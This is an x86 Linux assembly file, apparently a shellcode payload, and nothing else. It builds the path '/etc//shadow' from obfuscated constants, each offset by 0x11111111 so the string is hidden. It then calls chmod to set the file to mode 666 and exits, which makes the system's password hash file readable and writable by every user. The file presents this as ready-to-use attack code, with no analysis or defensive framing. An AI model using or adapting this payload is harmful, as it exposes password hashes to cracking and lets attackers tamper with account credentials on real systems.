global _start


section .text

_start:

	xor ecx,ecx
	mul ecx

	push eax

	push 0x665e5350		;0x776F6461  : actual value -1 wodahs/cte/
 	push 0x57621e1e		;0x68732F2F
	push 0x5263541e		;0x6374652F
	mov ebx ,esp
	push eax

	push word 0x1b6
	pop ecx

	add dword [ebx],0x11111111
	add dword [ebx+4],0x11111111
	add dword [ebx+8],0x11111111 

	mov al,0xf              ; permisson 666 in octal
	int 0x80

	mov al,0x1
	int 0x80
